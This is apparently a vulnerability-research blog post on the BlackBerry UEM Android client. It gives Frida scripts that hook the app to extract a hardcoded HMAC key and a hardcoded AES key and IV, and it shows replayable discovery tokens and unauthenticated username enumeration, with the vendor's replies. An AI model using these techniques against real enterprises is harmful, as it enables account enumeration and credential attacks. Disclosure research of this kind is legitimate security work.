---
layout: post
title: "BlackBerry MDM Has Some Authentication Flaws"
categories: tooling
# modified_date: 2024-04-18
---

After detailing authentication issues with [VMWare's Airwatch](https://emptynebuli.github.io/tooling/2020/12/11/aircross.html) and [Ivanti's MobileIron](https://emptynebuli.github.io/tooling/2021/03/22/rustyiron.html), I began to search other popular Mobile Device Management (MDM) tools for similar logic flaws. One of my primary targets for this effort was the BlackBerry MDM. Black who, you say? I know their solution set is not as popular as it once was but the MDM application is alive and well - [BlackBerry MDM](https://www.blackberry.com/us/en/solutions/mdm-mobile-device-management). Thinking back, I remember the numerous hours sifting through emails on my small BB device - wishing I had an Android instead. Well, today I am releasing research I had conducted on Android targeting the BlackBerry UEM client - I hope you enjoy it.

Like my previous research, the BlackBerry MDM client was contained in an Android APK - which is just a modified Java JAR file. Extraction of this file provides access to the Dalvik Executable (DEX) java bytecode. From here a small reverse engineering effort is needed to re-create most of the original source from these files. Some of my favorits are [dex2jar](https://github.com/pxb1988/dex2jar) and [jadx](https://github.com/skylot/jadx), I am usually able to make decent traction with one of these two tools.

Having recovered most of the BlackBerry MDM application code, I can see there have been some effort to obstruct analysis through "hodoring", aka masking, the code:

{% include image.html url="/assets/images/blackberry_img1.png" description="Figure 1: BlackBerry Source-Code Masking" %}

The next step is to capture some application data and review how requests are generated. The BlackBerry MDM client leverages certificate pinning and Manipulator-in-the-Middle (MitM) is not possible without disabling/bypassing this feature. To accomplish this task, I like to rely on [Frida](https://github.com/frida). 

<span class="callout warning">I will not be covering the use and configuration of Frida in this blog article and encourage the reader to review the content available through the referenced link. There are several online scripts that can assist with disabling certificate pinning in the Android system.</span>

Launching the MDM client and providing my email information, the client executes a discovery request to determine the location of the MDM endpoint. Discovery requests are a common practice in MDM and I have observed each solution to execute their own version of this process. However, similarly to MobileIron, BlackBerry has an authentication value associated with the request.

{% include image.html url="/assets/images/blackberry_img2.png" description="Figure 2: BlackBerry MDM Discovery - X-AuthToken" %}

The `X-AuthToken` was used to validate the request and without this value, a 401 failure was returned from the API:

{% include image.html url="/assets/images/blackberry_img3.png" description="Figure 3: BlackBerry MDM Discovery - Failed Request" %}

Interestingly enough, these values did seem to allow for replay attacks - which is always a useful tidy of information ;P..

{% include image.html url="/assets/images/blackberry_img4.png" description="Figure 4: BlackBerry MDM Discovery - Replay #1" %}

{% include image.html url="/assets/images/blackberry_img5.png" description="Figure 5: BlackBerry MDM Discovery - Replay #2" %}

Here enters the first challenge, where and how is this value generated? The APK is your only reference material here, so let's dive into the Android code! Ultimately, the function to generate this value was located in the `com.blackberry.emalib.util` package under the `e` class, in the `hodoR` method. Within this method call, I observed this value was an HMAC-SHA512 hash which contained several hardcoded values:

{% include image.html url="/assets/images/blackberry_img6.png" description="Figure 6: BlackBerry MDM - Hardcoded Keys" %}

The HMAC buffer was observed to be generated with the following values:
* `device ID`: unknown
* `device Type`: taimen
* `request timestamp`: 1673742104132
* `hodor`: The salt key appended to the array

This array would then be SHA512 hashed with the `f4208hoDoR` key - generating the `X-AuthToken` value. Extraction of these values was possible with the following Frida script:

```java
function bytes2hex(array) {
    var result = '';
    for (var i = 0; i < array.length; ++i)
        result += ('0' + (array[i] & 0xFF).toString(16)).slice(-2);
    return result;
};

// setTimeout is used to defines the timeout counter before the Java.perform function is call
setTimeout(function(){
    if (Java.available) {
    // Java.perform is the Frida function call to start injection
        Java.perform(function (){
            var UtilE = Java.use("com.blackberry.emalib.util.e");

            // Get HMAC-SHA512 Buffer Strings
            var hmacBuff = new Array();
            UtilE["hodor"].implementation = function (str) {
                if (str.length < 51) { // DB strings are about 51 characters
                    hmacBuff.push(str)
                }
                return this.hodor(str);
            };
            // Get HmacSHA512 Result Value
            UtilE["hodoR"].implementation = function () {
                // Add static salt
                hmacBuff.push("0x"+bytes2hex(this._hodor.value))
                console.log("[+] HMAC-Buff: "+JSON.stringify(hmacBuff))
                // Pull HMAC Key
                console.log('[+] HMAC Key: '+this.hoDoR.value)
                
                let ret = this.hodoR();
                console.log('[+] B64 HmacSHA512: ' + ret);
                return ret;
            };        

        })
    }
},0)
```

{% include caption.html description="Figure 7: com.blackberry.emalib.util.e HMAC-SHA512 Data Recovery – Frida Script" %}

This information was reported to BlackBerry and received the following response:

***"The reported behavior is the intended design. The Discovery Service is intended to bootstrap enterprise authentication and thus is unable to be strongly authenticated. The connection to the Discovery Service is encrypted in transit with TLS and the server certificate is validated against the platform root certificate authority (CA) store. The Discovery Service lookup can further be avoided if a QR code is used to bootstrap enterprise authentication. As a workaround, customers can disable Discovery Service bootstrapping to avoid the additional risk of PII correlation by following the steps below on the UEM Management Console."***

Ok, understood, hardcoded encryption keys are not a recognized vulnerability?! Moving on...

Being able to communicate with the discovery API is only step one of this process. My end goal is to generate authentication requests against the MDM solution. This effort is going to require going deeper. 

First, I need to understand how the authentication request is generated and sent. In the natural workflow of the MDM client, a user is asked to submit their `username` and `password`. Submitted this information generated the following request:

{% include image.html url="/assets/images/blackberry_img7.png" description="Figure 8: BlackBerry MDM Auth Request" %}

Based on the server response code - this will either pass or fail. FYI, during this research I only received failed authentication attempts. Although these failed authentication attempts did not recieve an *HTTP 200* response - they did indicate *valid* vs *invalid* username values.

{% include image.html url="/assets/images/blackberry_img8.png" description="Figure 9: BlackBerry MDM Auth Request - Failure Response" %}

It is obvious the submitted `username`/`password` data is encrypted and there is some reference to a public key. To determine how this information is generated I will need to return to the BlackBerry UEM client. Ultimately, encryption of these values is done as part of `libspekexp.so` - a native Java library. Native Java code is C, or similar, compiled libraries that are embedded into the APK package. This provides an additional layer of protectation against reverse engineering. Luckily for us, the compiled application is interpreted and loaded into memory, as part of the APK. As a result, we have access to manipulate the function calls via Frida ;P...

`libspekexp.so` was loaded in the `com.blackberry.emalib.bdmitransport` package within the `hooodor` class and called in the `H0dooor` method:

{% include image.html url="/assets/images/blackberry_img9.png" description="Figure 10: com.blackberry.emalib.bdmitransport.hooodor.H0dooor - spekexp.so Loaded" %}

The method call to `new Enroll` creates an enrollment objects via the method `EnrollmentInterface.enrollment_create`. This method call would return an *INT* value represeting an *ID* for the current enrollment request:

{% include image.html url="/assets/images/blackberry_img10.png" description="Figure 11: com.blackberry.enrollment - Enroll Initialization" %}

{% include image.html url="/assets/images/blackberry_img11.png" description="Figure 12: com.blackberry.enrollment - enrollment_create Method Call" %}

Based on references to `KEY_TYPE_RSA` in the method call for `new Enroll` (listed in *Figure 10*) there was an assumption this value was encrypted with some form of AES. AES is a pretty common encryption algorithm for web/mobile applications - so I felt this was a safe assumption. As there were no direct references to how encryption was performed, outside of the `libspekexp.so` native library, this is where I presumed this process to take place.

The following Frida script was leveraged to hook the native library and enumerate all method calls containing string values of `enroll` or `aes`:

```java
var libspekexp_addr = Module.findBaseAddress("libspekexp.so")
console.log("[+] libspekexp_addr is: "+libspekexp_addr)

if (libspekexp_addr) {
    console.log('[*] Libspekexp Exports: ')
    Process.findModuleByName("libspekexp.so").enumerateExports().forEach(function(exp) {
        if (exp.address != null) {
            if (exp.name.includes("enrollment")) {
                console.log("  [+] Enrollment Interface: "+exp.name)
            } else if (exp.name.includes("aes")) {
                console.log("  [+] AES Export: "+exp.name)
            }
        }
    })
}
```

{% include caption.html description="Figure 13: Frida Script - Native Library Enumeration" %}

{% include image.html url="/assets/images/blackberry_img12.png" description="Figure 14: libspekexp.so Exports" %}

Each function call was hooked to review the call arguments and return values. To accomplish this task I followed details in Awakened's blog - [Frida cheat sheet](https://awakened1712.github.io/hacking/hacking-frida/). The following is a skeleton template for how this was executed:

```java
function bytes2hex(array) {
    var result = '';
    for (var i = 0; i < array.length; ++i)
        result += ('0' + (array[i] & 0xFF).toString(16)).slice(-2);
    return result;
};

function edianPTR(array) {
    var result = '';
    for (var i = 4; i >= 0; i--)
        result += ('0' + (array[i] & 0xFF).toString(16)).slice(-2);
    console.log('[*] PTR: 0x'+result)
    return ptr('0x'+result)
};

setTimeout(function(){
    if (Java.available) {
    // Java.perform is the Frida function call to start injection
        Java.perform(function (){

            var libspekexp_addr = Module.findBaseAddress("libspekexp.so")
            console.log("[+] libspekexp_addr is: "+libspekexp_addr)

            // speke_aes_encrypt(int param_1,int param_2,long param_3,long param_4,long param_5,void *param_6,long param_7,long param_8,size_t *param_9,void **param_10)
            var spekeContexts = new Array()
            Interceptor.attach(speke_aes_encrypt, {
                onEnter: function (args) {
                    console.log("[*] HIT speke_aes_encrypt")
                    for (var i=0; i<9; ++i) {
                        spekeContexts.push(args[i])
                        console.log("  [**] speke_aes_encrypt ARGS["+i+"]: 0x"+bytes2hex(new Uint8Array(args[i].readByteArray(32))))
                    }
                },
                onLeave: function (retval) {
                    console.log('[*] HIT speke_aes_encrypt RET: '+JSON.stringify(retval))

                    for (var i=0; i<2; ++i) {
                        if (bytes2hex(new Uint8Array(spekeContexts[i].readByteArray(2))) != "0000") {
                            var p1 = edianPTR(new Uint8Array(spekeContexts[i].readByteArray(5)))
                            console.log("  [**] speke_aes_encrypt RET ARGS["+i+"]: 0x"+bytes2hex(new Uint8Array(p1.readByteArray(32))))
                        } else {
                            console.log("  [**] speke_aes_encrypt RET ARGS["+i+"]: 0x"+bytes2hex(new Uint8Array(spekeContexts[i].readByteArray(32))))
                        }
                        
                    }
                }
            })
        });
    }
},0);
```

{% include caption.html description="Figure 15: Frida Script - Native Library Hooking" %}

Examination of `speke_aes_encrypt` revealed a `key` and `IV` were passed as the 3rd and 5th arguments - respectively. IV stands for Initialization Vector and is used to prevent a sequence of bytes, identical to a previous sequence, from producing the same ciphertext when encrypted. This is essentially a seed value used to control the produced ciphertext.

{% include image.html url="/assets/images/blackberry_img13.png" description="Figure 16: libsepekexp.so - speke_aes_encrypt Function Constructor" %}

These argument values were observed to be consistent via numerous executions of the application, leading to the assumption these too were hardcoded. Recovery of the HEX values, representing the `key` and `IV` values, it was possible to locate their static offset `0x78600`:

{% include image.html url="/assets/images/blackberry_img14.png" description="Figure 17: libsepekexp.so - Hardcoded AES-256 Encryption Key and IV" %}

The following Frida script was used to hook the native library and extract the cipher values:

```java
function bytes2hex(array) {
    var result = '';
    for (var i = 0; i < array.length; ++i)
        result += ('0' + (array[i] & 0xFF).toString(16)).slice(-2);
    return result;
};

// setTimeout is used to defines the timeout counter before the Java.perform function is call
setTimeout(function(){
    if (Java.available) {
    // Java.perform is the Frida function call to start injection
        Java.perform(function (){
            var libspekexp_addr = Module.findBaseAddress("libspekexp.so")
            console.log("[+] libspekexp_addr is: "+libspekexp_addr)
            if (libspekexp_addr) {
                var enrollment_create = Module.findExportByName("libspekexp.so", "enrollment_create")
                console.log("[+] enrollment_create is: "+enrollment_create)
                var speke_aes_encrypt = Module.findExportByName("libspekexp.so", "speke_aes_encrypt")
                console.log("[+] speke_aes_encrypt is: "+speke_aes_encrypt)

                // Key/IV Recovery
                // speke_aes_encrypt(int param_1,int param_2,long param_3,long param_4,long param_5,void *param_6,long param_7,long param_8,size_t *param_9,void **param_10)
                Interceptor.attach(speke_aes_encrypt, {
                    onEnter: function (args) {
                        console.log("[*] HIT speke_aes_encrypt")
                        var cLength = args[2].toInt32()
                        var ivLength = args[4].toInt32()

                        console.log("[+] aes256-CBC Key: 0x"+bytes2hex(new Uint8Array(args[3].readByteArray(cLength))))
                        console.log("[+] aes256-CBC IV: 0x"+bytes2hex(new Uint8Array(args[5].readByteArray(ivLength))))
                    },
                    onLeave: function () {}
                })

                // enrollment_create(char *ptr_pin,char *ptr_usr,char *ptr_pass,ulong ptr_passLength,char *param_5,char *param_6,void *param_7,ulong param_8,char *param_9,void **param_10,char *param_11,char *cipher)
                Interceptor.attach(enrollment_create, {
                    onEnter: function (args) {
                        console.log("[*] HIT enrollment_create NATIVE")
                        console.log("[+] Encrypted User: "+Memory.readCString(args[0]))
                    },
                    onLeave: function () {}
                })
            }
        })
    }
},0)
```

{% include caption.html description="Figure 18: Frida Script - Encryption Key and IV Recovery" %}

Taking our previous encrypted authentication request, it was now possible to perform a deeper examination of the original auth request.

{% include image.html url="/assets/images/blackberry_img15.png" description="Figure 19: ORG BlackBerry MDM Auth Request" %}

Decoding the Base64 hashed bytecode revealed the 16-byte `IV`, followed by the encrypted username:

{% include image.html url="/assets/images/blackberry_img16.png" description="Figure 20: BlackBerry MDM - Decoded Username Submission" %}

Having recovered both the `key` and `IV` values, it was possible to manually encrypt any username value we need and submit to the API. Fun fact, although the BlackBerry UEM client has the user submit both the `username` and `password` values - only the username is submitted through this request. This leads me to assume that the BlackBerry UEM client is vulnerable to unauthenticated username enumeration because the server response indicates the user is invalid:

{% include image.html url="/assets/images/blackberry_img17.png" description="Figure 21: BlackBerry MDM - User Enumeration?" %}

This information was also reported to BlackBerry, receiving the following response:

***"The EC-SPEKE handshake is encrypted in transit with TLS and the server certificate is validated against the platform root certificate authority (CA) store. Assuming the platform and application have integrity (e.g. not rooted or hooked), this means the only parties who can decrypt the obfuscated username are the service operators (i.e. BlackBerry employees and Enterprise customers for their own users). We do not support multi-factor enrollment, the key authentication factor for all forms of UEM device enrollment is a limited-lifetime password or token. Note that in the outlined attack, the user ID alone is not sufficient to complete the key exchange and the potential attacker would still need to obtain the activation password."***

One interesting item of note in this response is BlackBerry identifies the enrollment function does not support *multi-factor*?! Indicating like AirWatch and MobileIron, BlackBerry too is vulnerable to SFA within the MDM application. Just some food for thought.

Although interesting, there is one additional aspect that needs mentioning. Recall, the encrypted username submission included both the `username` and a `client-public-key`. This public key, I must assume, is used in Elliptical Curve Cryptography (ECC) calculation for the transmission of the `password` value. Unfortunately, I was never able to fully validate this functionality as one does not always have all the tools they need when performing security research. I believe this process is used for the exchange of the password value, of course, assuming the user exists! In standard ECC validation, both sides would need to exchange their public key and perform some maths with their private key. This would generate a unique value, shared by both the server and client. This value would then be used to encrypt the submission of the password. A graphic from [Wikipedia](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) helps visualize how this process takes place:

{% include image.html url="/assets/images/blackberry_img18.png" description="Figure 22: ECC Key Exchange" %}

On the plus side, the public key only needs to be generated once and it can be submitted to the BlackBerry API numerous times - to validate username values. As I am not the best at coding, the following Frida script will hook the BlackBerry UEM client and recover the public/private keys for you - [here](https://github.com/emptynebuli/dauthi/blackberry.js)!!!

To conclude, this attack surface has been included into my new framework [Dauthi](https://githbub.com/emptynebuli/dauthi) an MDM authentication framework for conducting various activities against MDM solutions.

## Disclosure Timeline

* **January 26, 2023:** Vulnerability Identified.
* **February 14, 2023:** Vendor Notified.
* **February 21, 2023:** Vendor Response.
